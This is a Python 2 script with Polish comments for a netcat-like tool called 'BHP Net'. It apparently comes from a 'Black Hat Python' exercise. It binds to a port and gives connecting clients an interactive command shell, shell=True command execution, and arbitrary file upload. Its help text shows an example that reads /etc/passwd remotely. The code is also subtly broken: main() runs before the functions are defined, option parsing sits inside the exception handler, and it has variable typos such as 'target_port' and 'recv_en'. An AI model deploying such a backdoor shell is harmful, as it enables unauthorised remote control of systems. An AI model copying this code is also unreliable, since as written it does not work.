#coding=utf-8

import sys
import socket
import getopt
import threading
import subprocess

#definicje kilku zmiennych globalnych
listen = False
command = False
upload = False
execute =""
target =""
upload_destination =""
port = 0

def usage():
	print "Narzędzie BHP Net"
	print
	print """Sposób użycia: bhpnet.py -t taeget_host
	-p port"""
	print """-l --listen -nasłuchuje na [host]:[port] połączeń przychodzących """
	print """-e --execute=file_to_run - wykonuje dany plik, gdy odbierze połączenie """
	print """-c --command - inicjuje wiersz poleceń """
	print """-u --upload=destination -gdy odbierze połączenie, 
	wysyła plik i zapisuje do w [destination] \n\n"""
	print "Przykłady: "
	print "bhpnet.py -t 192.168.0.1 -p 5555 -l -c"
	print "bhpnet.py -t 192.168.0.1 -p 5555 -l -u:\\target.exe"
	print "bhpnet.py -t 192.168.0.1 -p 5555 -l -e\"cat /etc/passwd\""
	print "echo 'ABCDEFG' | ./bhpent.py -t 192.168.11.12 -p 135"
	sys.exit(0)

def main():
	global listen
	global port
	global execute
	global command
	global upload_destination
	global target

	if not len(sys.argv[1:]):
		usage()

	#odczyt opcji wiersza poleceń
	try:
		opts, args = getopt.getopt(sys.argv[1:], "hle:t:p:cu",
			["help", "listen", "execute","target", "port", "command", "upload"])
	except getopt.GetoptError as error:
		print str(err)
		usage()

		for o,a in opts:
			if o in ("-h", "--help"):
				usage()
			elif o in ("-l", "--listen"):
				listen = True
			elif o in ("-e", "--execute"):
				execute = a
			elif o in ("-c", "--command"):
				command = True
			elif o in ("-u", "--upload"):
				upload_destination = a

			elif o in ("-t", "--target"):
				target = a
			elif o in ("-p", "--port"):
				port = int(a)
			else:
				assert False, "Nieobsługiwana opcja"

		#Będziemy nasłuchiwać czy tylko wysyłać dane z stdin?
		if not listen and len(target) and port > 0:
			#Wczytuje bufor z wiersza poleceń
			#To powoduje blokodę, więc wyślij CTRL-D, gdy nie wysyłasz danych do stdin
			buffer = sys.stdin.read()

			#Wysyła dane
			client_sender(buffer)

		#Będziemy nasłuchiwać i ewentualnie coś wysyłać, wykonywać polecenia oraz
		#włączać powłokę w zależności od opcji wiersza poleceń
		if listen:
			server_loop()


main()

def client_sender(buffer):
	client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	try:
		#połączenie z docelowym hostem
		client.connect((target_port))

		if len(buffer):
			client.send(buffer)
		while True:
			#czekanie na zwrot danych
			recv_len = 1
			response = ""

			while recv_len:
				data = client.recv(4096)
				recv_en = len(data)
				response+=data

				if recv_len < 4096:
					break

			print response,

			#czekanie na więcej danych
			buffer = raw_input("")
			buffer+="\n"

			#wysyłanie danych
			client.send(buffer)

	except:
		print "[*] Wyjątek ! Zamykanie"
		#zakmnięcie połączenia
		client.close()

def server_loop():
	global target

	#jeśli nie zdefiniowo celu, nasłuchujemy na wszystkich interfejsach
	if not len(target):
		target ="0.0.0.0"

		server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		server.bind((target, port))
		server.listen(5)

		while True:
			client_socket, addr = server.accept()
			
			#wątek do obsługi naszego nowego klienta
			client_thread = threading.Thread(target=client_handler, args=(client_socket,))
			client_thread.start()

def run_command(command):
	#odcięcie znaku nowego wiersza
	command = command.rstrip()

	#wykonywanie polecenia i odebranie wyniku
	try:
		output = subprocess.check_output(command, stderr=subprocess.STDOUT, shell=True)
	except:
		output = "nie udało wykonać się polecenia\n"

	#wysyłanie wyniku do klienta
	return output


#mechanizm wysyłanie plików i wykonywania poleceń i moją konsolę
def client_handler(client_socket):
	global upload
	global execute
	global command

	#sprawdzanie czy coś jst wysyłane
	if len(upload_destination):
		#wczytanie wszystkich bajtów i zapis ich w miejscu docelowym
		file_buffer = ""

		#wczytywanie danych do końca
		while True:
			data = client_socket.recv(1024)

			if not data:
				break
			else:
				file_buffer += data

		#próba zapisania wczytanych bajtów
		try:
			file_descriptor = open(upload_destination, "wb")
			file_descriptor.write(file_buffer)
			file_descriptor.close()

			#potwierdzenie zapisania pliku
			client_socket.send("Zapisano plik w {0}".format(upload_destination))

		except:
			client_socket.send("Nie udało się zapiać pliku w {0}".format(upload_destination))


	#sprawdzanie czy wykonano polecenie
	if len(execute):
		#wykonanie polecenia
		output = run_command(execute)
		client_socket.send(output)

	#Jeżeli zażadano wiersza poleceń, przechodzimy do innej pętli
	if command:
		while True:
			#wyświetlanie prostego wiersza poleceń
			client_socket.send("<BHP:#> ")

					#Pobieramy tekst do napotkania znaku nowego wiersza
					#naciśnięcie kawiasza Enter
			cmd_buffer = ""
			while "\n" not in cmd_buffer:
					cmd_buffer += client_socket.recv(1024)

			#odesłanie wyniku polecenia
			response = run_command(cmd_buffer)

			#odesłanie odpowiedzi
			client_socket.send(response)